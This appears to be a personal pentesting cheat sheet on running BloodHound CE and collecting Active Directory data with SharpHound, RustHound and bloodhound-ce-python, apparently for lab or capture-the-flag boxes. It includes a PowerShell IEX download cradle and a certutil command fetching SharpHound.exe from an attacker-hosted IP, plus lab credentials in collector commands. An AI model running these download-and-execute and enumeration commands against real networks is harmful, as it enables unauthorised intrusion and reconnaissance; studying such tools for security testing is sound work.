---
publish: true
created: 2026-01-29T11:39:06.270+05:30
modified: 2026-06-21T20:04:00.852+05:30
---

## Running

Installation : <https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart>

```
# cd /opt/bloodhound
./bloodhound-cli up
# http://localhost:8080/ui - admin : Password123!
```

## ingestion - collectors

Best is SharpHound. but you need a shell to execute it on host.
rusthound is better than bloodhound-ce-python because rusthound collects certificate templates related data also while the latter does not.

### sharphound

```

# To Download SharpHound

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.5:8000/SharpHound.exe')"

certutil.exe -urlcache -split -f "http://10.10.16.5:8000/SharpHound.exe" SharpHound.exe

# Run
sharphound -c all

# collect and upload the generated zip to bloodhound
```

### rusthound

```
rusthound-ce -d DOMAIN.LOCAL -u USERNAME@DOMAIN.LOCAL -z
rusthound-ce -d resourced.local -u v.ventz@resourced.local -p 'HotelCalifornia194!' -z
```

### bloodhound-ce-python

<https://github.com/dirkjanm/BloodHound.py>

```
# installation - pipx install bloodhound-ce 
$ bloodhound-ce-python -c all -d pirate.htb -u pentest -p 'p3nt3st2025!&' -dc dc01.pirate.htb -ns 10.129.12.139
```

## Cyphers

<https://queries.specterops.io/?platforms=Active+Directory>

<https://github.com/CompassSecurity/bloodhoundce-resources/blob/main/custom_queries/BloodHound_CE_Custom_Queries.md>

```
MATCH (n:User),(m:Group)
MATCH p=(n)-[r:MemberOf*1..3]->(m)
RETURN p
```
